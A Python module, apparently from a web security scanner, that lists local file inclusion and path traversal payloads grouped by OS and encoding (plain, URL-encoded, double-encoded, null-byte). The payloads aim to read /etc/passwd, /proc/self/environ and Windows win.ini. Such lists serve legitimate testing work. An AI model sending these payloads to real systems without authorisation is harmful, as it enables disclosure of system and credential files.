"""LFI payload sets by OS and encoding style."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Iterable, List


@dataclass(frozen=True)
class PayloadSet:
    name: str
    os_family: str
    encoding: str
    payloads: List[str]


_PAYLOAD_SETS = [
    PayloadSet(
        name="unix-basic",
        os_family="unix",
        encoding="plain",
        payloads=[
            "../../../../etc/passwd",
            "..\\../..\\../..\\../etc/passwd",
            "/etc/passwd",
            "../../../../proc/self/environ",
        ],
    ),
    PayloadSet(
        name="windows-basic",
        os_family="windows",
        encoding="plain",
        payloads=[
            "..\\..\\..\\..\\windows\\win.ini",
            "C:\\Windows\\win.ini",
            "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "..\\..\\..\\..\\boot.ini",
        ],
    ),
    PayloadSet(
        name="url-encoded",
        os_family="mixed",
        encoding="url-encoded",
        payloads=[
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        ],
    ),
    PayloadSet(
        name="double-encoded",
        os_family="mixed",
        encoding="double-url-encoded",
        payloads=[
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
        ],
    ),
    PayloadSet(
        name="null-byte",
        os_family="mixed",
        encoding="truncation",
        payloads=[
            "../../../../etc/passwd%00",
            "..\\..\\..\\..\\windows\\win.ini%00",
            "../../../../etc/passwd%00.php",
        ],
    ),
]


def get_payload_sets() -> List[PayloadSet]:
    """Return all built-in payload sets."""
    return list(_PAYLOAD_SETS)


def iter_payloads() -> Iterable[tuple[str, str]]:
    """Yield payload and payload set name."""
    for payload_set in _PAYLOAD_SETS:
        for payload in payload_set.payloads:
            yield payload, payload_set.name
